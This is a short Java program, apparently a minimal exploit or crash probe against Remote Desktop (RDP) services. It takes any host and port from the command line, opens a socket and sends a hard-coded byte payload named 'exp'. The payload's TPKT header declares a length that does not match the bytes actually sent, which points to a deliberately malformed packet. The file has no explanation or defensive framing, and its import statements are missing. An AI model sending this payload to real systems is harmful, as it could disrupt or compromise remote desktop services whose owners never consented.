public class RDPConnection {

    private static final String exp = "0300002b02f0807f00000000000000010008000000000000";

    public static void sendRDPRequest(String rhost, int rport) {
        try {
            byte[] payload = hexStringToByteArray(exp);

            Socket socket = new Socket();
            socket.connect(new InetSocketAddress(rhost, rport), 3);

            OutputStream out = socket.getOutputStream();
            out.write(payload);
            out.flush();

            socket.close();

        } catch (SocketTimeoutException ex) {
            System.err.println("Connection timed out: " + ex.getMessage());
        } catch (IOException ex) {
            System.err.println("Error connecting or sending data: " + ex.getMessage());
        }
    }

    private static byte[] hexStringToByteArray(String s) {
        int len = s.length();
        byte[] data = new byte[len / 2];
        for (int i = 0; i < len; i += 2) {
            data[i / 2] = (byte) ((Character.digit(s.charAt(i), 16) << 4)
                    + Character.digit(s.charAt(i + 1), 16));
        }
        return data;
    }

    public static void main(String[] args) {
        if (args.length != 2) {
            System.err.println("Usage: java RDPConnection <rhost> <rport>");
            return;
        }

        String rhost = args[0];
        int rport = Integer.parseInt(args[1]);

        sendRDPRequest(rhost, rport);
    }
}
